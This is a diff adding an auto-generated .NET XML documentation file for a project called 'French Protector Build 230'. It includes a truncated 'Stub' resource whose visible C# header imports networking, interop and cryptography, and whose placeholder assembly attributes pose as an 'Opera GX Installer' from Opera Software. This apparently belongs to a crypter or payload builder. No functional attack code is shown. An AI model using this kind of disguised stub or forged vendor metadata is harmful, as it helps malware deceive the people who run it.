@@ -1,0 +1,46 @@
+﻿<?xml version="1.0"?>
+<doc>
+<assembly>
+<name>
+French Protector Build 230
+</name>
+</assembly>
+<members>
+<member name="T:French_Protector_Build_230.My.Resources.Resources">
+<summary>
+  A strongly-typed resource class, for looking up localized strings, etc.
+</summary>
+</member>
+<member name="P:French_Protector_Build_230.My.Resources.Resources.ResourceManager">
+<summary>
+  Returns the cached ResourceManager instance used by this class.
+</summary>
+</member>
+<member name="P:French_Protector_Build_230.My.Resources.Resources.Culture">
+<summary>
+  Overrides the current thread's CurrentUICulture property for all
+  resource lookups using this strongly typed resource class.
+</summary>
+</member>
+<member name="P:French_Protector_Build_230.My.Resources.Resources.Stub">
+<summary>
+  Looks up a localized string similar to 
+using System;
+using System.Collections.Generic;
+//download using System.Diagnostics;
+using System.Net;
+using System.Reflection;
+using System.Runtime.InteropServices;
+using System.Security.Cryptography;
+using System.Text;
+using System.Threading;
+using System.Windows.Forms;
+
+//iamassembly [assembly: AssemblyTitle(&quot;Opera GX&quot;)]
+//iamassembly [assembly: AssemblyDescription(&quot;Opera GX Installer&quot;)]
+//iamassembly [assembly: AssemblyCompany(&quot;Opera Software&quot;)]
+//iamassembly [assembly: AssemblyProduct(&quot; [rest of string was truncated]&quot;;.
+</summary>
+</member>
+</members>
+</doc>
